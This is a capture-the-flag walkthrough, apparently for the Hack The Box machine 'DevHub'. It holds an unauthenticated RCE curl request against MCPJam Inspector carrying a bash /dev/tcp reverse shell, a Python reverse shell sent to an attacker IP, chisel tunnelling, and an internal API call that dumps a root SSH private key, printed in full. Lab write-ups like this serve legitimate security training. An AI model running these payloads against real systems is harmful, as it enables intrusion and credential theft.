# DevHub-HTB
```bash
sudo nmap -T4 --min-rate 1000 -A -sC -p22,80,6274 devhub.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-31 08:43 -0300
Nmap scan report for devhub.htb (10.129.9.109)
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevHub - Internal Development Platform
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sun, 31 May 2026 11:43:18 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 11:43:18 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 11:43:19 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.98%I=7%D=5/31%Time=6A1C1ED6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credential
SF:s:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20
SF:charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Sun,\x2031\x20May\x202026\
SF:x2011:43:18\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/
SF:svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x
SF:20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-
SF:DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20<
SF:/body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content
SF:\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-m
SF:ethods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent
SF:-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x2
SF:02026\x2011:43:18\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReques
SF:t,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credent
SF:ials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DEL
SF:ETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset
SF:=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x202026\x2011:43:19\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSS
SF:tatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
                                                      SF:20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.19 (90%), Linux 5.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 6274/tcp)
HOP RTT       ADDRESS
1   72.12 ms  10.10.16.1
2   124.98 ms devhub.htb (10.129.9.109)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.23
seconds
```
The website on port 80 is the follo
This is the wesite and it gives a lot of information for us, for example, there is an open port 6274 that is being used fot mcp hadling and also an internal porta that might be of use later:
<img width="1919" height="707" alt="image" src="https://github.com/user-attachments/assets/2daa2d39-c37c-46b7-8a4a-3bcec10d5464" />

Port 6374 gives us this:
<img width="1918" height="782" alt="image" src="https://github.com/user-attachments/assets/3c5fe000-fdee-4473-a269-9dd9935d8a77" />

We can find the version for MCP jam:
<img width="1684" height="774" alt="image" src="https://github.com/user-attachments/assets/60bd28f3-3e4f-4b49-b9c4-14487797a476" />

Now, if we google MCP version 1.4.2, we'll find the following CVE: https://github.com/advisories/GHSA-232v-j27c-5pp6. It's a very usefull RCE that can be triggered via a simple curl. It works because the mcp API is binded to 0.0.0.0, meaning that anyone can access the API. COupled with that, tthe requests that go there are not sanitized. First set up a nc listener:
```bash
nc -lnvp 4444
```
Then send this request to the website, be carefull to alter you info:
```bash
curl -s -i -X POST http://devhub.htb:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{"serverId":"rev","serverConfig":{"command":"bash","args":["-lc","bash -i >& /dev/tcp/<your_ip/4444 0>&1"],"env":{},"timeout":5000}}'          
```
Execute it and get shell:
<img width="789" height="341" alt="image" src="https://github.com/user-attachments/assets/1e911613-e981-4c3f-8bc0-a6c70b08c28c" />

Now, let's make some inspections, first the open ports. Use the following command:
```bash
ss -tulpn
```
The return shows port 8888 open, where the wqebsite specified we woudl be able to find jupyter labs open. Let's foward this port to us and try access it. Since we do not have actuall ssh connection to analyst which is the user we want to get to, we must use chisel a tool that can do just that.

First, download chisel latest release from this link https://github.com/jpillora/chisel/releases/latest . Then follow the steps contained in this page here: https://1337skills.com/cheatsheets/chisel/.
<img width="475" height="331" alt="image" src="https://github.com/user-attachments/assets/61c5cea5-52c5-4c76-98a8-5022a02d439b" />

Now open a python server at the same folder chisel is open:
```bash
python -m http.server
```
<img width="596" height="79" alt="image" src="https://github.com/user-attachments/assets/5e79ed98-7b22-44ba-9463-2b065fafdb6b" />

Now, go to the webshell and download chisel from yourself:
```bash
wget http://<yourip>:8000/chisel_1.11.5_linux_amd64
```
<img width="916" height="110" alt="image" src="https://github.com/user-attachments/assets/647da6b3-7aac-485d-b350-85c0f69c8413" />
<img width="874" height="226" alt="image" src="https://github.com/user-attachments/assets/cc677a29-fe54-4cbc-939e-e1cb09a22766" />

Now, go back to your machine and create a server with chisel:
<img width="780" height="103" alt="image" src="https://github.com/user-attachments/assets/041a0c1e-28d5-4102-9adb-ea4266e035be" />


Now switch over to the machine and start a client with chisel:
<img width="888" height="93" alt="image" src="https://github.com/user-attachments/assets/63e4241b-0f5c-4a81-b20e-020c3bb0057f" />

Now access port 8888 on your localhost:
<img width="1024" height="753" alt="Captura de tela 2026-06-03 162328" src="https://github.com/user-attachments/assets/6903cf47-5183-4f91-bf80-bd69f10cc3d1" />

We need a token for acess, luckily theu left us instruction for how to look for it. Go to the machine and execute
```bash
ps -aux
```
<img width="1906" height="142" alt="image" src="https://github.com/user-attachments/assets/dd76e950-c662-4678-b908-dc2fe1c03f2c" />

We have a token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 and using it takes us to the jupyter notebook page. First we must open a new notebook:
<img width="325" height="153" alt="image" src="https://github.com/user-attachments/assets/8c713c5d-84a8-4f27-97dc-018be88ed13b" />

Then, set up a nc listener and paste this reverseshell to the notebook and execute it with shift+enter:
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.14",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```
<img width="1548" height="76" alt="image" src="https://github.com/user-attachments/assets/7110ccd2-a922-4a9e-a1d0-5587cae6eeed" />
And get shell:
<img width="763" height="579" alt="image" src="https://github.com/user-attachments/assets/33c50925-1938-47f8-9d5f-e31f8fafd0af" />

If we remember the ss -tulpn output port 5000 was open. If we try to curl it goes like this:
```bash
curl http://localhost:5000
{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}
```
Execute ls -la at analyst /home and we can see the .opsmcp_key (opsmcp_secret_key_4f5a6b7c8d9e0f1a):
<img width="951" height="405" alt="image" src="https://github.com/user-attachments/assets/eda4b129-340e-4c19-8dc5-8e6705953a0c" />
Send a health reques to 5000 to see if that's it:
```bash
curl -X GET http://localhost:5000/health \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"curl -X GET http://localhost:5000/healthcurl -X GET http://localhost:5000/health \
> 
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"curl -X GET http://localhost:5000/health
{"status":"healthy","uptime":"14d 3h 22m"}
{"status":"healthy","uptime":"14d 3h 22m"}
```

Ok, now we know where to look for, but what are we looking for. If we go to /opt/opsmcp and execute these commands:
```bash
cd /opt/opsmcp
server.py
cat server.py
```
We'll see the script running the server and inside it the location fo the ssh keys and how to ask for them:
<img width="992" height="430" alt="image" src="https://github.com/user-attachments/assets/a672c53f-cf3a-4292-bc78-f943067ae4ab" />

Knowing this, modify your curl accordingly and you'll recieve the private key to ssh as root:
```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'curl -X POST http://127.0.0.1:5000/tools/call \
>   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
> > > > > > > > 
  }'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```
Now clean up the key a bit removing all the \n's and such and create an .ssh folder and inside it a id_rsa key with the key inside it like so:
<img width="661" height="729" alt="Captura de tela 2026-06-03 180715" src="https://github.com/user-attachments/assets/6aca1203-9f32-4faa-b87c-903a061585bb" />

Now simply connect to root via SSH and get root:
<img width="653" height="605" alt="Captura de tela 2026-06-03 180917" src="https://github.com/user-attachments/assets/492c7ac9-929b-46ee-b943-f3f180a8f742" />



